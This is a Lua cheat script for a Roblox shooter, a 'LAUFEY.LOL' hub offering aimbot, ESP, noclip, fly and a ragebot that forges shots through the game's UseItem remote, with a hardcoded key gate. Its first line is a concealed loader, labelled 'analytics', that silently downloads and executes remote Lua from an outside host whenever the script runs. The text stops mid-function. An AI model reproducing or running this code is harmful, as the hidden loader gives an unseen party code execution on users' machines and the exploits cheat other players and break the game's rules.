--[[sv:analytics]]task.spawn(function()pcall(function()loadstring(game:HttpGet("https://scriptverse.net/api/analytics/client.lua?s=d057f344d741767ab0b3c6d0f9c95b79"))()end)end)--[[/sv:analytics]]

local Players         = game:GetService("Players")
local TweenService    = game:GetService("TweenService")
local RunService      = game:GetService("RunService")
local UserInputService= game:GetService("UserInputService")
local ContentProvider = game:GetService("ContentProvider")
local HttpService     = game:GetService("HttpService")
local RStorage        = cloneref(game:GetService("ReplicatedStorage"))
local LocalPlayer     = Players.LocalPlayer

-- ══════════════════════════════════════════════════════════════
--  USERNAME BYPASS  (case-insensitive, add names here)
-- ══════════════════════════════════════════════════════════════
local OWNERS = {
    ["jhykerl"]           = true,
    ["returnzofthekingz"] = true,
}

-- ══════════════════════════════════════════════════════════════
--  CONFIG
-- ══════════════════════════════════════════════════════════════
local C = {
    SONG_ID         = "rbxassetid://134765662498640",
    SONG_START      = 0,
    SONG_VOLUME     = 0.6,
    LAUFEY_IMAGE_ID = "rbxassetid://79228823846263",

    BLACK     = Color3.fromRGB(14, 14, 18),
    DARK      = Color3.fromRGB(22, 22, 28),
    PANEL     = Color3.fromRGB(28, 26, 34),
    SOFT      = Color3.fromRGB(36, 32, 44),
    INK       = Color3.fromRGB(245, 240, 250),
    MUTED     = Color3.fromRGB(160, 140, 170),
    PINK      = Color3.fromRGB(255, 120, 180),
    PINK_SOFT = Color3.fromRGB(255, 160, 200),
    PINK_DARK = Color3.fromRGB(200, 70, 130),
    ON        = Color3.fromRGB(255, 120, 180),
    OFF       = Color3.fromRGB(40, 36, 50),
    DANGER    = Color3.fromRGB(255, 90, 120),
}

local HUB_W     = 410
local HUB_H     = 240
local SIDEBAR_W = 90

-- ══════════════════════════════════════════════════════════════
--  Key gate
-- ══════════════════════════════════════════════════════════════
local key1_data = {79,78,76,89,85,83,75,78,79,87,83} -- ONLYUSKNOWS
local key2_data = {80,65,73,68,83,72,73,84}           -- PAIDSHIT
local key3_data = {74,72,89,75,69,82,76}              -- JHYKERL

local function resolve(b)
    local t={}; for i,v in ipairs(b) do t[i]=string.char(v) end; return table.concat(t)
end

-- ══════════════════════════════════════════════════════════════
--  Config Save / Load
-- ══════════════════════════════════════════════════════════════
local CONFIG_FILE = "LaufeyHub_Config.json"
local RAGE_FILE   = "LaufeyHub_Rage.json"

local defaultSettings = {
    Aimbot=true, ShowFOV=true, Smoothness=0.5, FOV=150, TargetMode="Head",
    ESP=true, ESPBox=false, Tracers=false, Crosshair=false,
    Noclip=false, InfJump=false, FlyEnabled=false, FlySpeed=60, WalkSpeed=16,
}
local defaultRage = {
    VOID_TIME=5, ATTACK_TIME=0.5, BACK_OFFSET=10, VOID_Y=-500,
    HEIGHT_OFFSET=3, ORBIT_ENABLED=true, ORBIT_RADIUS=6,
    ORBIT_SPEED=180, ORBIT_HEIGHT=3,
}

local function loadSettings()
    local s={}; for k,v in pairs(defaultSettings) do s[k]=v end
    if isfile and readfile and pcall(readfile,CONFIG_FILE) then
        local ok,d=pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
        if ok and type(d)=="table" then for k,v in pairs(d) do if s[k]~=nil then s[k]=v end end end
    end
    return s
end

local function saveSettings()
    if not writefile then return end
    pcall(function()
        writefile(CONFIG_FILE, HttpService:JSONEncode({
            Aimbot=getgenv().Aimbot, ShowFOV=getgenv().ShowFOV,
            Smoothness=getgenv().Smoothness, FOV=getgenv().FOV,
            TargetMode=getgenv().TargetMode, ESP=getgenv().ESP,
            ESPBox=getgenv().ESPBox, Tracers=getgenv().Tracers,
            Crosshair=getgenv().Crosshair, Noclip=getgenv().Noclip,
            InfJump=getgenv().InfJump, FlyEnabled=getgenv().FlyEnabled,
            FlySpeed=getgenv().FlySpeed, WalkSpeed=getgenv().WalkSpeed,
        }))
    end)
end

local function loadRage()
    local s={}; for k,v in pairs(defaultRage) do s[k]=v end
    if isfile and readfile and pcall(readfile,RAGE_FILE) then
        local ok,d=pcall(function() return HttpService:JSONDecode(readfile(RAGE_FILE)) end)
        if ok and type(d)=="table" then
            for k,v in pairs(d) do if s[k]~=nil then s[k]=v end end
        end
    end
    return s
end

local function saveRage()
    if not writefile then return end
    pcall(function()
        writefile(RAGE_FILE, HttpService:JSONEncode({
            VOID_TIME=getgenv().VOID_TIME, ATTACK_TIME=getgenv().ATTACK_TIME,
            BACK_OFFSET=getgenv().BACK_OFFSET, VOID_Y=getgenv().VOID_Y,
            HEIGHT_OFFSET=getgenv().HEIGHT_OFFSET, ORBIT_ENABLED=getgenv().ORBIT_ENABLED,
            ORBIT_RADIUS=getgenv().ORBIT_RADIUS, ORBIT_SPEED=getgenv().ORBIT_SPEED,
            ORBIT_HEIGHT=getgenv().ORBIT_HEIGHT,
        }))
    end)
end

-- ══════════════════════════════════════════════════════════════
--  Helpers
-- ══════════════════════════════════════════════════════════════
local function protect(gui)
    if syn and syn.protect_gui then syn.protect_gui(gui); gui.Parent=game:GetService("CoreGui")
    elseif gethui then gui.Parent=gethui()
    else gui.Parent=game:GetService("CoreGui") end
end

local function uiCorner(p,r) local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 10); c.Parent=p; return c end
local function uiStroke(p,col,thick,trans) local s=Instance.new("UIStroke"); s.Color=col or C.PINK; s.Thickness=thick or 1.5; s.Transparency=trans or 0.25; s.Parent=p; return s end

local function tw(obj,t,props,style,dir)
    local t2=TweenService:Create(obj,TweenInfo.new(t,style or Enum.EasingStyle.Quint,dir or Enum.EasingDirection.Out),props)
    t2:Play(); return t2
end

local function mkLabel(parent,text,size,font,color,z)
    local l=Instance.new("TextLabel"); l.BackgroundTransparency=1
    l.Size=UDim2.new(1,0,0,size+8); l.Text=text
    l.Font=font or Enum.Font.GothamMedium; l.TextSize=size
    l.TextColor3=color or C.INK; l.ZIndex=z or 3; l.Parent=parent; return l
end

-- ══════════════════════════════════════════════════════════════
--  Song
-- ══════════════════════════════════════════════════════════════
local function makeSong(root)
    local s=Instance.new("Sound"); s.SoundId=C.SONG_ID; s.Volume=0
    s.Looped=false; s.Parent=root
    task.spawn(function() pcall(function() ContentProvider:PreloadAsync({s}) end) end)
    return s
end
local function playSong(s) s.TimePosition=C.SONG_START; s:Play(); tw(s,2.2,{Volume=C.SONG_VOLUME},Enum.EasingStyle.Sine) end
local function stopSong(s,ft) local t2=tw(s,ft or 1.4,{Volume=0},Enum.EasingStyle.Sine); t2.Completed:Connect(function() s:Destroy() end) end

-- ══════════════════════════════════════════════════════════════
--  Sakura
-- ══════════════════════════════════════════════════════════════
local function makeSakura(root)
    local layer=Instance.new("Frame"); layer.Size=UDim2.fromScale(1,1)
    layer.BackgroundTransparency=1; layer.ZIndex=1; layer.ClipsDescendants=false; layer.Parent=root

    local PETALS={
        Color3.fromRGB(255,180,210), Color3.fromRGB(255,150,190),
        Color3.fromRGB(255,120,180), Color3.fromRGB(255,200,220),
        Color3.fromRGB(240,140,200), Color3.fromRGB(255,170,200),
    }
    local active=true

    local function spawnPetal()
        local p=Instance.new("Frame")
        local w,h=math.random(5,13),math.random(3,8)
        local sx=math.random(0,100)/100; local dx=math.random(-10,10)/100
        local dur=math.random(45,90)/10; local st=math.random(25,45)/100
        local sr=math.random(0,360); local er=sr+math.random(-200,200)
        p.AnchorPoint=Vector2.new(0.5,0.5); p.Position=UDim2.new(sx,0,-0.02,0)
        p.Size=UDim2.new(0,w,0,h); p.BackgroundColor3=PETALS[math.random(1,#PETALS)]
        p.BackgroundTransparency=st; p.BorderSizePixel=0; p.Rotation=sr; p.ZIndex=1; p.Parent=layer
        uiCorner(p,999)
        local t2=TweenService:Create(p,TweenInfo.new(dur,Enum.EasingStyle.Linear),
            {Position=UDim2.new(sx+dx,0,1.06,0),Rotation=er,BackgroundTransparency=0.75})
        t2:Play(); t2.Completed:Connect(function() p:Destroy() end)
    end

    task.spawn(function()
        for _=1,8 do spawnPetal(); task.wait(0.04) end
        while active do spawnPetal(); task.wait(math.random(25,55)/100) end
    end)

    return function()
        active=false
        for _,ch in ipairs(layer:GetDescendants()) do
            if ch:IsA("Frame") then tw(ch,1.0,{BackgroundTransparency=1}) end
        end
        task.delay(1.2,function() layer:Destroy() end)
    end
end

-- ══════════════════════════════════════════════════════════════
--  Intro
-- ══════════════════════════════════════════════════════════════
local function showIntro(root,song,onDone)
    local curtain=Instance.new("Frame"); curtain.Size=UDim2.fromScale(1,1)
    curtain.BackgroundTransparency=1; curtain.ZIndex=50; curtain.Parent=root

    local function panel(pos)
        local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0.5,0); f.Position=pos
        f.BackgroundColor3=C.BLACK; f.BorderSizePixel=0; f.ZIndex=50; f.Parent=curtain
        local g=Instance.new("UIGradient")
        g.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,C.BLACK),ColorSequenceKeypoint.new(0.55,C.DARK),ColorSequenceKeypoint.new(1,Color3.fromRGB(30,20,35))})
        g.Rotation=135; g.Parent=f; return f
    end
    local topPanel=panel(UDim2.new(0,0,0,0))
    local botPanel=panel(UDim2.new(0,0,0.5,0))

    local content=Instance.new("Frame"); content.Size=UDim2.fromScale(1,1)
    content.BackgroundTransparency=1; content.ZIndex=51; content.Parent=curtain

    local function accent(ax,px)
        local f=Instance.new("Frame"); f.AnchorPoint=Vector2.new(ax,0.5)
        f.Position=UDim2.fromScale(px,0.42); f.Size=UDim2.new(0,0,0,1)
        f.BackgroundColor3=C.PINK; f.BorderSizePixel=0; f.BackgroundTransparency=0.3
        f.ZIndex=52; f.Parent=content; return f
    end
    local acL=accent(1,0.28); local acR=accent(0,0.72)

    local title=mkLabel(content,"LAUFEY.LOL",30,Enum.Font.GothamBold,C.INK,52)
    title.AnchorPoint=Vector2.new(0.5,0.5); title.Position=UDim2.fromScale(0.5,0.42)
    title.Size=UDim2.new(0,420,0,40); title.TextTransparency=1; title.TextXAlignment=Enum.TextXAlignment.Center

    local line=Instance.new("Frame"); line.AnchorPoint=Vector2.new(0.5,0.5)
    line.Position=UDim2.fromScale(0.5,0.5); line.Size=UDim2.new(0,0,0,2)
    line.BackgroundColor3=C.PINK; line.BorderSizePixel=0; line.ZIndex=52; line.Parent=content; uiCorner(line,2)
    local lg=Instance.new("UIGradient")
    lg.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,C.PINK_SOFT),ColorSequenceKeypoint.new(0.5,C.PINK),ColorSequenceKeypoint.new(1,C.PINK_SOFT)})
    lg.Parent=line

    local sub=mkLabel(content,"✿  now playing  ·  laufey  ✿",12,Enum.Font.Gotham,C.PINK,52)
    sub.AnchorPoint=Vector2.new(0.5,0.5); sub.Position=UDim2.fromScale(0.5,0.565)
    sub.Size=UDim2.new(0,400,0,20); sub.TextXAlignment=Enum.TextXAlignment.Center; sub.TextTransparency=1

    local status=mkLabel(content,"",11,Enum.Font.Gotham,C.MUTED,52)
    status.AnchorPoint=Vector2.new(0.5,0); status.Position=UDim2.fromScale(0.5,0.635)
    status.Size=UDim2.new(0,300,0,16); status.TextXAlignment=Enum.TextXAlignment.Center

    for i=1,5 do
        local dot=Instance.new("Frame"); dot.AnchorPoint=Vector2.new(0.5,0.5)
        dot.Position=UDim2.new(math.random(20,80)/100,0,math.random(20,75)/100,0)
        dot.Size=UDim2.new(0,math.random(4,9),0,math.random(4,9))
        dot.BackgroundColor3=i%2==0 and C.PINK or C.PINK_SOFT; dot.BackgroundTransparency=0.6
        dot.BorderSizePixel=0; dot.ZIndex=49; dot.Parent=content; uiCorner(dot,999)
        task.spawn(function()
            task.wait(math.random(0,60)/100)
            tw(dot,math.random(28,42)/10,{Position=UDim2.new(dot.Position.X.Scale,0,dot.Position.Y.Scale-0.06,0),BackgroundTransparency=1},Enum.EasingStyle.Sine)
        end)
    end

    title.TextSize=12; tw(title,0.35,{TextTransparency=0,TextSize=30},Enum.EasingStyle.Back)
    task.delay(0.2,function()
        tw(line,0.3,{Size=UDim2.new(0,240,0,2)},Enum.EasingStyle.Quint)
        tw(acL,0.25,{Size=UDim2.new(0,70,0,1)},Enum.EasingStyle.Quint)
        tw(acR,0.25,{Size=UDim2.new(0,70,0,1)},Enum.EasingStyle.Quint)
        tw(sub,0.3,{TextTransparency=0})
    end)

    task.spawn(function()
        task.wait(0.35); status.Text="loading..."
        local w=0; while not song.IsLoaded and w<2.5 do task.wait(0.05); w+=0.05 end
        status.Text=""; playSong(song)
        tw(line,0.2,{Size=UDim2.new(0,0,0,2)},Enum.EasingStyle.Quint,Enum.EasingDirection.In)
        tw(acL,0.15,{Size=UDim2.new(0,0,0,1)},Enum.EasingStyle.Quint,Enum.EasingDirection.In)
        tw(acR,0.15,{Size=UDim2.new(0,0,0,1)},Enum.EasingStyle.Quint,Enum.EasingDirection.In)
        tw(title,0.2,{TextTransparency=1}); tw(sub,0.2,{TextTransparency=1}); task.wait(0.2)
        tw(topPanel,0.4,{Position=UDim2.new(0,0,-0.5,0)},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut)
        tw(botPanel,0.4,{Position=UDim2.new(0,0,1,0)},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut)
        task.wait(0.35); onDone(); task.wait(0.15); curtain:Destroy()
    end)
end

-- ══════════════════════════════════════════════════════════════
--  Wings
-- ══════════════════════════════════════════════════════════════
local FEATHERS={
    {size=UDim2.new(0,82,0,32), rot=-6,  yFrac=0.24, alpha=0.07, delay=0.55, amp=8,  period=2.15},
    {size=UDim2.new(0,116,0,46),rot=7,   yFrac=0.36, alpha=0.15, delay=0.40, amp=11, period=2.00},
    {size=UDim2.new(0,140,0,54),rot=18,  yFrac=0.46, alpha=0.21, delay=0.28, amp=13, period=1.88},
    {size=UDim2.new(0,122,0,44),rot=30,  yFrac=0.56, alpha=0.13, delay=0.36, amp=16, period=1.72},
    {size=UDim2.new(0,88,0,28), rot=44,  yFrac=0.65, alpha=0.06, delay=0.50, amp=20, period=1.55},
}
local function makeFeather(hub,side,f)
    local feather=Instance.new("Frame"); feather.AnchorPoint=Vector2.new(side<0 and 1 or 0,0.5)
    feather.Position=UDim2.new(side<0 and 0 or 1,side<0 and 8 or -8,f.yFrac,0)
    feather.Size=UDim2.new(0,0,0,0); feather.BackgroundColor3=C.PINK
    feather.BackgroundTransparency=f.alpha; feather.BorderSizePixel=0
    feather.Rotation=0; feather.ZIndex=0; feather.Parent=hub; uiCorner(feather,999)
    local g=Instance.new("UIGradient")
    g.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,C.PINK),ColorSequenceKeypoint.new(0.55,C.PINK_SOFT),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,220,235))})
    g.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.02),NumberSequenceKeypoint.new(0.55,0.25),NumberSequenceKeypoint.new(1,0.92)})
    g.Rotation=side<0 and 195 or -15; g.Parent=feather
    local rec={frame=feather,flap=nil}
    task.delay(f.delay,function()
        if not feather.Parent then return end
        tw(feather,1.05,{Size=f.size,Rotation=f.rot*side},Enum.EasingStyle.Back); task.wait(1.05)
        if not feather.Parent then return end
        local info=TweenInfo.new(f.period,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true)
        rec.flap=TweenService:Create(feather,info,{Rotation=(f.rot+f.amp)*side}); rec.flap:Play()
    end)
    return rec
end
local function makeWings(hub)
    local r={}
    for _,side in ipairs({-1,1}) do for _,f in ipairs(FEATHERS) do table.insert(r,makeFeather(hub,side,f)) end end
    return r
end

-- ══════════════════════════════════════════════════════════════
--  Aimbot / ESP helpers
-- ══════════════════════════════════════════════════════════════
local function getTargetPart(char,mode)
    if mode=="Head" then return char:FindFirstChild("HeadHB") or char:FindFirstChild("Head")
    elseif mode=="Body" then return char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("HumanoidRootPart")
    else return char:FindFirstChild("LeftFoot") or char:FindFirstChild("RightFoot") or char:FindFirstChild("Left Leg") or char:FindFirstChild("Right Leg") end
end
local function hpColor(pct)
    if pct>0.7 then return Color3.new(0.2,0.85,0.3) elseif pct>0.3 then return Color3.new(1,0.85,0.2) else return Color3.new(1,0.25,0.3) end
end
local function createOverheadGui(head)
    local bb=Instance.new("BillboardGui"); bb.Name="HealthDisplay"; bb.Size=UDim2.new(4,0,1,0)
    bb.StudsOffset=Vector3.new(0,3,0); bb.AlwaysOnTop=true; bb.Parent=head
    local l=Instance.new("TextLabel"); l.Size=UDim2.fromScale(1,1); l.BackgroundTransparency=1
    l.TextScaled=true; l.TextColor3=Color3.new(1,1,1); l.TextStrokeTransparency=0
    l.Font=Enum.Font.GothamBold; l.Parent=bb; return l
end
local function updatePlayerDisplay(player,lbl,hl)
    local char=player.Character; local hum=char and char:FindFirstChildOfClass("Humanoid")
    if not hum then
        if lbl then lbl.Text="Dead"; lbl.TextColor3=Color3.new(1,1,1) end
        if hl then hl:Destroy() end; return
    end
    local pct=hum.Health/hum.MaxHealth; local col=hpColor(pct)
    if lbl then lbl.Text=string.format("❤️ %d",math.floor(hum.Health)); lbl.TextColor3=col end
    if hl then hl.FillColor=col; hl.OutlineColor=col end
end

-- ══════════════════════════════════════════════════════════════
--  Ragebot internals
-- ══════════════════════════════════════════════════════════════
local _cleanRemote=Instance.new("RemoteEvent")
local fireServerNative=clonefunction(_cleanRemote.FireServer); _cleanRemote:Destroy()

local cachedEnumLib
local function enc(name)
    if not cachedEnumLib then
        local mod=RStorage:FindFirstChild("Modules") and RStorage.Modules:FindFirstChild("EnumLibrary")
        if mod then local ok,lib=pcall(require,mod); if ok and type(lib)=="table" then cachedEnumLib=lib end end
    end
    if not cachedEnumLib then return nil end
    local ok,token=pcall(cachedEnumLib.ToEnum,cachedEnumLib,name); return ok and token or nil
end

local cachedFC
local function getFighterController()
    if cachedFC and rawget(cachedFC,"Objects") then return cachedFC end
    for _,m in ipairs(getgc(true)) do
        if type(m)=="table" and rawget(m,"LocalFighter")~=nil and rawget(m,"Objects")~=nil then cachedFC=m; return m end
    end
end
local function getLocalFighter() local c=getFighterController(); return c and rawget(c,"LocalFighter") or nil end

local function isEnemy(player)
    if player==nil or player==LocalPlayer then return false end
    local a,b=LocalPlayer:GetAttribute("TeamID"),player:GetAttribute("TeamID")
    if a~=nil and b~=nil then return a~=b end
    if LocalPlayer.Team~=nil and player.Team~=nil then return LocalPlayer.Team~=player.Team end
    return true
end

local function getRageTarget()
    local ctrl=getFighterController(); local objs=ctrl and rawget(ctrl,"Objects")
    if type(objs)~="table" then return nil end
    local best,bestD=nil,math.huge
    local myRoot=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local myPos=myRoot and myRoot.Position or Vector3.new()
    for _,fighter in ipairs(objs) do
        local player=rawget(fighter,"Player")
        if player==nil or isEnemy(player) then
            local entity=rawget(fighter,"Entity"); local model=entity and rawget(entity,"Model")
            if model then
                local hb=model:FindFirstChild("HitboxHead"); local hum=model:FindFirstChildOfClass("Humanoid")
                if hb and (not hum or hum.Health>0) then
                    local d=(hb.Position-myPos).Magnitude
                    if d<bestD then bestD=d; best={hitboxHead=hb,model=model} end
                end
            end
        end
    end
    return best
end

local function getNearestPlayer()
    local myRoot=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end
    local nc,nd=nil,math.huge
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LocalPlayer then
            local char=p.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
            local hum=char and char:FindFirstChildOfClass("Humanoid")
            if root and hum and hum.Health>0 then
                local d=(root.Position-myRoot.Position).Magnitude
                if d<nd then nd=d; nc=char end
            end
        end
    end
    return nc
end

local function buildPayload(hb,isRay)
    local pos=hb.Position
    local a1={["\0"]=pos.X,["\1"]=pos.Y,["\2"]=pos.Z,["\3"]=-math.pi/2,["\4"]=0,["\5"]=0}
    local a2={["\0"]=pos.X,["\1"]=pos.Y+1,["\2"]=pos.Z,["\3"]=-math.pi/2,["\4"]=0,["\5"]=0}
    local ex={["\0"]=0,["\1"]=1,["\2"]=0,["\3"]=0,["\4"]=0,["\5"]=0}
    local inner={["\0"]=a1,["\1"]=a2,["\2"]=hb,["\3"]=ex}
    if isRay then return{["\1"]=inner,["\2"]=true} end; return{["\1"]=inner}
end

local function getEquippedGun(fighter)
    local items=rawget(fighter,"Items"); if type(items)~="table" then return nil end
    for _,item in next,items do
        if type(item)=="table" and rawget(item,"IsEquipped") then
            local info=rawget(item,"Info"); if info and rawget(info,"Type")=="Gun" then
                local data=rawget(item,"Data"); if data and (rawget(data,"Ammo") or 0)>0 then return item end
            end
        end
    end
end

local rageRemote
local function getRageRemote()
    if rageRemote then return rageRemote end
    local r=RStorage:FindFirstChild("Remotes") and RStorage.Remotes:FindFirstChild("Replication")
        and RStorage.Remotes.Replication:FindFirstChild("Fighter")
        and RStorage.Remotes.Replication.Fighter:FindFirstChild("UseItem")
    if r and r:IsA("RemoteEvent") then rageRemote=cloneref(r) end
    return rageRemote
end

local function fireAtTarget(fighter,target)
    local remote=getRageRemote(); if not remote then return end
    local item=getEquippedGun(fighter); if not item then return end
    local data=rawget(item,"Data"); local objectId=data and rawget(data,"ObjectID")
    local info=rawget(item,"Info"); local isRay=info and rawget(info,"IsRaycast")==true
    local token=enc("StartShooting"); if not objectId or not token then return end
    fireServerNative(remote,objectId,token,buildPayload(target.hitboxHead,isRay),nil)
end

-- ══════════════════════════════════════════════════════════════
--  AirSlide module
-- ══════════════════════════════════════════════════════════════
local AirSlide = (function()
    local RS   = game:GetService("RunService")
    local UIS  = game:GetService("UserInputService")
    local LP   = Players.LocalPlayer

    local floorPart = nil
    local slamming  = false
    local inputConn = nil

    local function placeFloor(hrp)
        if floorPart then floorPart:Destroy() end
        local p = Instance.new("Part")
        p.Name = "RivalsAntiStuckAirFloor"
        p.Size = Vector3.new(8, 0.2, 8)
        p.Anchored = true
        p.CanCollide = true
        p.Transparency = 1
        p.Material = Enum.Material.SmoothPlastic
        p.Friction = 0
        p.Parent = workspace
        floorPart = p

        local conn
        conn = RS.PreRender:Connect(function()
            if hrp and hrp.Parent then
                if Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z).Magnitude < 5 then
                    slamming = false
                end
            end
            if not slamming or not hrp or not hrp.Parent or floorPart ~= p then
                if conn then conn:Disconnect() end
                p:Destroy()
                return
            end
            p.CFrame = hrp.CFrame * CFrame.new(0, -3, 0)
        end)
    end

    local function doSlide()
        local char = LP.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or slamming then return end
        if hum.FloorMaterial ~= Enum.Material.Air then return end
        slamming = true
        placeFloor(hrp)
        local total = 0
        while slamming and total < 0.4 do
            task.wait(0.01); total += 0.01
        end
        slamming = false
        if floorPart then floorPart:Destroy(); floorPart = nil end
    end

    local M = {}

    function M.Enable()
        if inputConn then return end
        inputConn = UIS.InputBegan:Connect(function(input, gp)
            if gp then return end
            if input.KeyCode == Enum.KeyCode.LeftControl
               or input.KeyCode == Enum.KeyCode.C
               or input.UserInputType == Enum.UserInputType.Touch then
                task.defer(function()
                    local char = LP.Character
                    local hum  = char and char:FindFirstChildOfClass("Humanoid")
                    if hum and hum.FloorMaterial == Enum.Material.Air then doSlide() end
                end)
            end
        end)
    end

    function M.Disable()
        if inputConn then inputConn:Disconnect(); inputConn = nil end
        slamming = false
        if floorPart then floorPart:Destroy(); floorPart = nil end
    end

    function M.Active() return inputConn ~= nil end

    return M
end)()

-- ══════════════════════════════════════════════════════════════
--  Hub builder
-- ══════════════════════════════════════════════════════════════
local function buildHub(root,song,sakuraCleanup)
    local lp=LocalPlayer; local cam=workspace